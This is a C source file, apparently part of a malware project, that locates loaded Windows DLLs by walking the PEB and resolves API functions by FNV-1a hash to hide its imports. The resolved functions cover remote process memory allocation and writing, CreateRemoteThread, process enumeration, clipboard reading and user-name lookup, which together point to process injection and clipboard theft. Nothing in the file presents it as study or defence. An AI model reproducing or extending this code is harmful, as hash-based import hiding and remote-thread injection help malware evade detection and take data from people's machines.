#include "peb-lookup.h"
#include <stdint.h>

DYNAMIC_APIS g_Api = {0};

DWORD HashStringFNV1a(const char* str) {
    DWORD hash = FNV1A_OFFSET_BASIS;
    while (*str) {
        hash ^= (DWORD)(unsigned char)*str;
        hash *= FNV1A_PRIME;
        str++;
    }
    return hash;
}

DWORD HashStringFNV1aW(const wchar_t* str) {
    DWORD hash = FNV1A_OFFSET_BASIS;
    while (*str) {
        wchar_t ch = *str;
        if (ch >= L'a' && ch <= L'z')
            ch -= 0x20;
        hash ^= (DWORD)ch;
        hash *= FNV1A_PRIME;
        str++;
    }
    return hash;
}

HMODULE GetModuleBase_Hashed(DWORD moduleHash) {
    PEB* pPeb = (PEB*)__readgsqword(0x60);
    PMY_PEB_LDR_DATA pLdr = (PMY_PEB_LDR_DATA)pPeb->Ldr;
    LIST_ENTRY* pHead = &pLdr->InMemoryOrderModuleList;
    LIST_ENTRY* pCurrent = pHead->Flink;

    while (pCurrent != pHead) {
        PMY_LDR_DATA_TABLE_ENTRY pEntry = CONTAINING_RECORD(pCurrent, MY_LDR_DATA_TABLE_ENTRY, InMemoryOrderLinks);
        if (pEntry->BaseDllName.Buffer != NULL) {
            if (HashStringFNV1aW(pEntry->BaseDllName.Buffer) == moduleHash) {
                return (HMODULE)pEntry->DllBase;
            }
        }
        pCurrent = pCurrent->Flink;
    }
    return NULL;
}

FARPROC GetExportAddress_Hashed(HMODULE hMod, DWORD functionHash) {
    BYTE* pBase = (BYTE*)hMod;

    /* Validate DOS header magic */
    IMAGE_DOS_HEADER* pDos = (IMAGE_DOS_HEADER*)pBase;
    if (pDos->e_magic != IMAGE_DOS_SIGNATURE)
        return NULL;

    /* Locate NT headers */
    IMAGE_NT_HEADERS* pNt = (IMAGE_NT_HEADERS*)(pBase + pDos->e_lfanew);
    if (pNt->Signature != IMAGE_NT_SIGNATURE)
        return NULL;

    /* Locate the Export Directory */
    IMAGE_DATA_DIRECTORY* pExportDir =
        &pNt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT];

    if (pExportDir->VirtualAddress == 0 || pExportDir->Size == 0)
        return NULL;

    IMAGE_EXPORT_DIRECTORY* pExports =
        (IMAGE_EXPORT_DIRECTORY*)(pBase + pExportDir->VirtualAddress);

    /* Arrays of export data (all RVAs from module base) */
    DWORD* pAddressOfFunctions    = (DWORD*)(pBase + pExports->AddressOfFunctions);
    DWORD* pAddressOfNames        = (DWORD*)(pBase + pExports->AddressOfNames);
    WORD*  pAddressOfNameOrdinals = (WORD*)(pBase + pExports->AddressOfNameOrdinals);

    /* Walk all named exports */
    for (DWORD i = 0; i < pExports->NumberOfNames; i++) {
        const char* exportName = (const char*)(pBase + pAddressOfNames[i]);

        if (HashStringFNV1a(exportName) == functionHash) {
            /*
             * The ordinal table maps name index -> function index.
             * AddressOfFunctions[ordinal] gives the function RVA.
             */
            WORD ordinal = pAddressOfNameOrdinals[i];
            DWORD funcRva = pAddressOfFunctions[ordinal];

            /*
             * Check for forwarded exports: if the function RVA falls within
             * the export directory, it's a forwarder string, not a real address.
             * We skip forwarded exports for simplicity.
             */
            if (funcRva >= pExportDir->VirtualAddress &&
                funcRva < pExportDir->VirtualAddress + pExportDir->Size) {
                return NULL; /* Forwarded export — not handled */
            }

            return (FARPROC)(pBase + funcRva);
        }
    }

    return NULL;
}

DYNAMIC_APIS * InitDynamicAPIs(void) {
    HMODULE hKernel32 = GetModuleBase_Hashed(HASH_KERNEL32_DLL);
    HMODULE hUser32 = GetModuleBase_Hashed(HASH_USER32_DLL);
    HMODULE hAdvapi32 = GetModuleBase_Hashed(HASH_ADVAPI32_DLL);

    if (hKernel32 == NULL) return NULL;

    #define RESOLVE(hMod, type, member, hash) \
        do { \
            if (hMod) { \
                g_Api.member = (type)GetExportAddress_Hashed(hMod, hash); \
            } \
        } while (0)

    /* KERNEL32 */
    RESOLVE(hKernel32, fnOpenProcess, pOpenProcess, HASH_OpenProcess);
    RESOLVE(hKernel32, fnVirtualAllocEx, pVirtualAllocEx, HASH_VirtualAllocEx);
    RESOLVE(hKernel32, fnVirtualProtect, pVirtualProtect, HASH_VirtualProtect);
    RESOLVE(hKernel32, fnWriteProcessMemory, pWriteProcessMemory, HASH_WriteProcessMemory);
    RESOLVE(hKernel32, fnCreateRemoteThread, pCreateRemoteThread, HASH_CreateRemoteThread);
    RESOLVE(hKernel32, fnVirtualFreeEx, pVirtualFreeEx, HASH_VirtualFreeEx);
    RESOLVE(hKernel32, fnCloseHandle, pCloseHandle, HASH_CloseHandle);
    RESOLVE(hKernel32, fnGetStdHandle, pGetStdHandle, HASH_GetStdHandle);
    RESOLVE(hKernel32, fnWriteFile, pWriteFile, HASH_WriteFile);
    RESOLVE(hKernel32, fnCreateToolhelp32Snapshot, pCreateToolhelp32Snapshot, HASH_CreateToolhelp32Snapshot);
    RESOLVE(hKernel32, fnProcess32First, pProcess32First, HASH_Process32First);
    RESOLVE(hKernel32, fnProcess32Next, pProcess32Next, HASH_Process32Next);
    RESOLVE(hKernel32, fnGetLastError, pGetLastError, HASH_GetLastError);
    RESOLVE(hKernel32, fnFormatMessageA, pFormatMessageA, HASH_FormatMessageA);
    RESOLVE(hKernel32, fnSleep, pSleep, HASH_Sleep);
    RESOLVE(hKernel32, fnWaitForSingleObject, pWaitForSingleObject, HASH_WaitForSingleObject);
    RESOLVE(hKernel32, fnDisableThreadLibraryCalls, pDisableThreadLibraryCalls, HASH_DisableThreadLibraryCalls);
    RESOLVE(hKernel32, fnGlobalLock, pGlobalLock, HASH_GlobalLock);
    RESOLVE(hKernel32, fnGlobalUnlock, pGlobalUnlock, HASH_GlobalUnlock);
    RESOLVE(hKernel32, fnGetCurrentProcess, pGetCurrentProcess, HASH_GetCurrentProcess);

    /* USER32 */
    RESOLVE(hUser32, fnGetClipboardSequenceNumber, pGetClipboardSequenceNumber, HASH_GetClipboardSequenceNumber);
    RESOLVE(hUser32, fnOpenClipboard, pOpenClipboard, HASH_OpenClipboard);
    RESOLVE(hUser32, fnGetClipboardData, pGetClipboardData, HASH_GetClipboardData);
    RESOLVE(hUser32, fnCloseClipboard, pCloseClipboard, HASH_CloseClipboard);

    /* ADVAPI32 */
    RESOLVE(hAdvapi32, fnGetUserNameA, pGetUserNameA, HASH_GetUserNameA);

    #undef RESOLVE
    return &g_Api;
}

DYNAMIC_APIS * getAPI(void) {
    return &g_Api;
}
